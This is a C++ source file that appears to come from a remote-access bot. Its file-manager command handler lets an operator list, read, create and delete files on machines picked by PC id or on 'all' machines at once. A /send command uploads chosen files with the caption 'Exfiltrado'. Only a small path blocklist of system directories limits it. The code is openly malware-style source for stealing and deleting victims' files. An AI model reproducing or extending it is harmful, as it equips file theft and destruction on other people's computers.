#include "application/commands/FileManagerHandler.hpp"

#include <algorithm>
#include <cctype>
#include <vector>

namespace nuub::application::commands {

FileManagerHandler::FileManagerHandler(
    interfaces::IFileManagerService& filemgr,
    interfaces::IReporter& reporter,
    std::string pc_id)
    : filemgr_(filemgr)
    , reporter_(reporter)
    , pc_id_(std::move(pc_id)) {}

bool FileManagerHandler::matches(const std::string& target) const {
    std::string lower = target;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    std::string lower_pc = pc_id_;
    std::transform(lower_pc.begin(), lower_pc.end(), lower_pc.begin(), ::tolower);
    return lower == lower_pc || lower == "all";
}

// Check for path traversal attempts
static bool is_path_safe(const std::string& path) {
    // Block relative path traversal
    if (path.find("..") != std::string::npos) return false;
    // Block absolute paths to sensitive system directories
    std::string lower = path;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    static const std::vector<std::string> blocked = {
        "c:\\windows",
        "c:\\program files",
        "c:\\programdata",
        "/etc",
        "/proc",
        "/sys",
    };
    for (const auto& b : blocked) {
        if (lower.find(b) == 0) return false;
    }
    return true;
}

domain::Result<void> FileManagerHandler::handle_ls(const std::string& target, const std::string& path) {
    if (!matches(target)) return domain::Result<void>::success();

    std::string dir = path.empty() ? "." : path;
    if (!is_path_safe(dir)) {
        reporter_.send_message("Acceso denegado: ruta no permitida.");
        return domain::Result<void>::success();
    }
    auto listing = filemgr_.list_directory(dir);
    reporter_.send_message(listing);
    return domain::Result<void>::success();
}

domain::Result<void> FileManagerHandler::handle_mkdir(const std::string& target, const std::string& path) {
    if (!matches(target)) return domain::Result<void>::success();

    if (path.empty()) {
        reporter_.send_message("Uso: /mkdir [target] <path>");
        return domain::Result<void>::success();
    }

    if (!is_path_safe(path)) {
        reporter_.send_message("Acceso denegado: ruta no permitida.");
        return domain::Result<void>::success();
    }

    if (filemgr_.create_directory(path)) {
        reporter_.send_message("Directorio creado: " + path);
    } else {
        reporter_.send_message("Error creando directorio: " + path);
    }
    return domain::Result<void>::success();
}

domain::Result<void> FileManagerHandler::handle_rm(const std::string& target, const std::string& path) {
    if (!matches(target)) return domain::Result<void>::success();

    if (path.empty()) {
        reporter_.send_message("Uso: /rm [target] <path>");
        return domain::Result<void>::success();
    }

    if (!is_path_safe(path)) {
        reporter_.send_message("Acceso denegado: ruta no permitida.");
        return domain::Result<void>::success();
    }

    if (filemgr_.delete_file(path)) {
        reporter_.send_message("Eliminado: " + path);
    } else if (filemgr_.delete_directory(path)) {
        reporter_.send_message("Directorio eliminado: " + path);
    } else {
        reporter_.send_message("Error eliminando: " + path);
    }
    return domain::Result<void>::success();
}

domain::Result<void> FileManagerHandler::handle_cat(const std::string& target, const std::string& path) {
    if (!matches(target)) return domain::Result<void>::success();

    if (path.empty()) {
        reporter_.send_message("Uso: /cat [target] <path>");
        return domain::Result<void>::success();
    }

    if (!is_path_safe(path)) {
        reporter_.send_message("Acceso denegado: ruta no permitida.");
        return domain::Result<void>::success();
    }

    auto content = filemgr_.read_file(path);
    if (content) {
        reporter_.send_message("Content of " + path + ":\n" + *content);
    } else {
        reporter_.send_message("Error leyendo archivo: " + path);
    }
    return domain::Result<void>::success();
}

domain::Result<void> FileManagerHandler::handle_send(const std::string& target, const std::string& path) {
    if (!matches(target)) return domain::Result<void>::success();

    if (path.empty()) {
        reporter_.send_message("Uso: /send [target] <path>");
        return domain::Result<void>::success();
    }

    if (!is_path_safe(path)) {
        reporter_.send_message("Acceso denegado: ruta no permitida.");
        return domain::Result<void>::success();
    }

    if (!filemgr_.file_exists(path)) {
        reporter_.send_message("Archivo no encontrado: " + path);
        return domain::Result<void>::success();
    }

    if (reporter_.send_file(path, "Exfiltrado: " + path)) {
        reporter_.send_message("Archivo enviado: " + path);
    } else {
        reporter_.send_message("Error enviando archivo: " + path);
    }
    return domain::Result<void>::success();
}

} // namespace nuub::application::commands
